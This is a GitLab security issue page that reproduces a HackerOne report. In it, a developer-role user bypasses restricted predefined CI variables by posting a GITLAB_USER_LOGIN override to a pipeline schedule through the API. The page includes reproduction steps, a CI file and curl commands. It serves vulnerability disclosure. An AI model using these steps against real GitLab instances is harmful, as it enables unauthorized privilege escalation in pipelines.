=== Content from gitlab.com_05cd290a_20250111_044426.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Bypass predefined vars

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2125189](https://hackerone.com/reports/2125189)** by `ali_shehab` on 2023-08-27, assigned to [@rshambhuni](/rshambhuni "Rohit Shambhuni"):

[Report](#report) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Hi team. An admin can set that only maintainer and owner can bypass predefined variables. If you put it to true, when a developer tries to override manually he will get an error, however, this is bypassable by rest API

##### Steps to reproduce

1. Create a group and a project in the group.
2. Add this .gitlab-ci.yaml file to the project and lock this file.

```
stages:
  - build
  - owner-only

build:
  stage: build
  image: ubuntu
  script:
    - echo "This is a normal job..."

owner-only:
  stage: owner-only
  image: ubuntu
  script:
    - echo "This should only run is the pipeline was triggered by ali_shehab"
  rules:
    - if: '$GITLAB_USER_LOGIN == "ali_shehab"'
```

4. This means that owner-only job will only be triggered if the pipeline trigger is ali\_shehab.
5. Disable overriding variables:

```
curl -X PUT -H "PRIVATE-TOKEN: TOKEN" "https://gitlab-private.net/api/v4/projects/16?restrict_user_defined_variables=true"
```

6. Now invite user B with a developer role.
7. Now user B create a schedule pipeline.
8. He send this api request to add variables to the schedule pipeline.

```
curl --request POST --header "PRIVATE-TOKEN:  TOKEN" "https://gitlab.com/api/v4/projects/{project}/pipeline_schedules/{pipeline_scheduleus}/variables?key=GITLAB_USER_LOGIN&value=ali_shehab"
```

9. Now he run the schedule and he overrides the prededined vars.

#### Impact

Able to bypass predefined variables even if only the maintainer and developers are allowed.

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


